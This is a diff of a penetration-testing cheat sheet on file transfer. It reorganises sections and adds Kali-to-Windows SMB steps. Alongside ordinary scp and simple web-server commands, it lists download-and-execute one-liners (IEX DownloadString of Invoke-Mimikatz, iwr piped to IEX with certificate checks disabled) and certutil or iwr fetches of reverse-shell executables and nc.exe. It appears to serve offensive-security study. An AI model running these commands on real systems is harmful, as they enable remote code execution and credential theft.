@@ -7,7 +7,6 @@ title: File Transfer Cheat Sheet
 # File Transfer Cheat Sheet
 
 ### Linux Transfer
-
 ```bash
 #Using Wget
 wget https://raw.snip.com/LinEnum.sh -O /tmp/LinEnum.sh
@@ -28,6 +27,87 @@ sudo systemctl enable ssh
 sudo systemctl start ssh
 scp plaintext@192.168.49.128:/root/myroot.txt .
 ```
+
+### Linux Servers
+```bash
+#Python3 Web Server
+python3 -m http.server
+Python2.7 Web Server
+python2.7 -m SimpleHTTPServer
+
+#PHP Web Server
+php -S 0.0.0.0:8000
+
+#Ruby Web Server
+ruby -run -ehttpd . -p8000
+
+#SMB Server
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+#SMB Server Authentication
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+#FTP Server
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+
+### Windows Transfer
+```powershell
+#Certutil
+certutil -urlcache -f http://10.10.10.10/rshell.exe rshell.exe
+
+#PowerShell DownloadFile
+(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+
+#PowerShell DownloadFileAsync
+(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+
+#PowerShell DownloadString Fileless
+IEX (New-Object Net.WebClient).DownloadString('https://raw.snip.com/snip/InvokeMimikatz.ps1')
+
+#PowerShell Invoke-WebRequest
+Invoke-WebRequest https://raw.snip.com/snip/PowerView.ps1 -OutFile PowerView.ps1
+iwr http://10.10.200.2:8000/rev.exe -OutFile C:\Users\john\Downloads\rev.exe
+
+#PowerShell UsingBasicParsing
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+
+#PowerShell FTP
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftpfile.txt')
+
+#PowerShell SSL Error
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+#SMB
+copy \\192.168.220.133\share\nc.exe
+
+#SMB Authentication
+net use n: \\192.168.220.133\share /user:test test
+copy n:\nc.exe
+
+#Putty
+pscp -i C:\path\to\your\privatekey.ppk C:\path\to\your\file kaliuser@kali-ip-address:/path/to/destination
+```
+
+### Kali ↔️ Windows
+```powershell
+#On kali create smb folder using impacket
+python3 smbserver.py test $(pwd) -smb2support -user test -password test
+
+#On Windows connect the smb folder: 
+$pass=ConvertTo-SecureString 'test' -AsPlainText -Force
+$cred=New-Object System.Management.Automation.PSCRedential('test',$pass)
+New-PSDrive -Name test -PSProvider FileSystem -Credential $cred -Root \\192.168.21.44\test
+
+#Copy file from windows to Kali
+Copy-Item -Path C:\tmp\PrivescCheck_ALST-HH-SQL01.html -Destination test:\
+
+#Remove shared folder from Windows
+Remove-PSDrive -Name test
+Get-PSDrive -PSProvider FileSystem (to check the folder was removed)
+```
+
 ### SCP
 ```bash
 #Copy single local file to a remote destination.
@@ -70,85 +150,25 @@ scp -C user@server:/path/to/file /path/to/folder
 #Specify port
 scp -P 2222 user@server:/home/jane/file /home/jane/
 ```
-### Linux Servers
-```bash
-#Python3 Web Server
-python3 -m http.server
-Python2.7 Web Server
-python2.7 -m SimpleHTTPServer
 
-#PHP Web Server
-php -S 0.0.0.0:8000
-
-#Ruby Web Server
-ruby -run -ehttpd . -p8000
-
-#SMB Server
-sudo impacket-smbserver share -smb2support /tmp/smbshare
-
-#SMB Server Authentication
-sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
-
-#FTP Server
-sudo python3 -m pyftpdlib --port 21 --write
-```
-
-### Windows Transfer
-
-```powershell
-#Certutil
-certutil -urlcache -f http://10.10.10.10/rshell.exe rshell.exe
-
-#PowerShell DownloadFile
-(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
-
-#PowerShell DownloadFileAsync
-(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
-
-#PowerShell DownloadString Fileless
-IEX (New-Object Net.WebClient).DownloadString('https://raw.snip.com/snip/InvokeMimikatz.ps1')
-
-#PowerShell Invoke-WebRequest
-Invoke-WebRequest https://raw.snip.com/snip/PowerView.ps1 -OutFile PowerView.ps1
-
-#PowerShell UsingBasicParsing
-Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
-
-#PowerShell FTP
-(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftpfile.txt')
-
-#PowerShell SSL Error
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-
-#SMB
-copy \\192.168.220.133\share\nc.exe
-
-#SMB Authentication
-net use n: \\192.168.220.133\share /user:test test
-copy n:\nc.exe
-```
 
 ### Code Transfer
-
-```python
+```bash
 #Python2 Download
 python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.snip.com/snip/LinEnum.sh", "LinEnum.sh")'
 
 #Python3 Download
 python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.snip.com/snip/LinEnum.sh", "LinEnum.sh")'
-```
-```php
+
 #PHP File_get_contents() Download
 php -r '$file = file_get_contents("https://raw.snip.com/snip/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 
 #PHP Fopen() Download
 php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
-```
-```ruby
+
 #Ruby Download
 ruby -e 'require "net/http"; File.write("LinEnum.sh",Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
-```
-```perl
+
 #Perl Download
 perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");
 ```
